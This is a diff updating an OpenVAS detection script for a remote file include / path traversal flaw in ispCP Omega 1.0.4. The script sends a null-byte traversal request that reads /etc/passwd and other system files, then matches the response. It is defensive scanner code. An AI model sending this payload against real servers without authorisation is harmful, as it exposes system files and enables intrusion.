@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_ispcp_38644.nasl 5306 2017-02-16 09:00:16Z teissa $
+# $Id: gb_ispcp_38644.nasl 5762 2017-03-29 11:20:04Z cfi $
 #
 # ispCP Omega 'net2ftp_globals[application_skinsdir]' Parameter Remote File Include Vulnerability
 #
@@ -34,12 +34,11 @@ and the underlying system; other attacks are also possible.
 
 ispCP Omega 1.0.4 is vulnerable; other versions may also be affected.";
 
-
-if (description)
+if(description)
 {
  script_id(100526);
- script_version("$Revision: 5306 $");
- script_tag(name:"last_modification", value:"$Date: 2017-02-16 10:00:16 +0100 (Thu, 16 Feb 2017) $");
+ script_version("$Revision: 5762 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-29 13:20:04 +0200 (Wed, 29 Mar 2017) $");
  script_tag(name:"creation_date", value:"2010-03-11 12:36:18 +0100 (Thu, 11 Mar 2010)");
  script_bugtraq_id(38644);
  script_tag(name:"cvss_base", value:"7.5");
@@ -54,7 +53,7 @@ if (description)
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
- script_dependencies("find_service.nasl", "http_version.nasl");
+ script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name : "summary" , value : tag_summary);
@@ -63,36 +62,31 @@ if (description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
-   
-port = get_http_port(default:80);
+include("host_details.inc");
 
-if(!get_port_state(port))exit(0);
+port = get_http_port(default:80);
 if(!can_host_php(port:port))exit(0);
 
-dirs = make_list("/ispcp",cgi_dirs());
+foreach dir( make_list_unique( "/ispcp", cgi_dirs( port:port ) ) ) {
 
-foreach dir (dirs) {
-   
-  url = string(dir, "/index.php"); 
-  req = http_get(item:url, port:port);
-  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);  
+  if( dir == "/" ) dir = "";
+  url = dir + "/index.php";
+  buf = http_get_cache(item:url, port:port);
   if( buf == NULL )continue;
 
   if(egrep(pattern: "Powered by <a[^>]+>ispCP Omega", string: buf, icase: TRUE)) {
 
-    url = string(dir,"/tools/filemanager/skins/mobile/admin1.template.php?net2ftp_globals[application_skinsdir]=../../../../../../../../../../../etc/passwd%00");
-    req = http_get(item:url, port:port);
-    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
+    foreach file (keys(files)) {
 
-    if(egrep(pattern:"(root:.*:0:[01]:)", string: buf)) {
-     
-      security_message(port:port);
-      exit(0);
+      url = string(dir,"/tools/filemanager/skins/mobile/admin1.template.php?net2ftp_globals[application_skinsdir]=../../../../../../../../../../../",files[file] ,"%00");
 
-    }  
-
+      if(http_vuln_check(port:port, url:url,pattern:file)) {
+        report = report_vuln_url( port:port, url:url );
+        security_message( port:port, data:report );
+        exit( 0 );
+      }
+    }
   }
 }
 
-exit(0);
+exit( 99 );
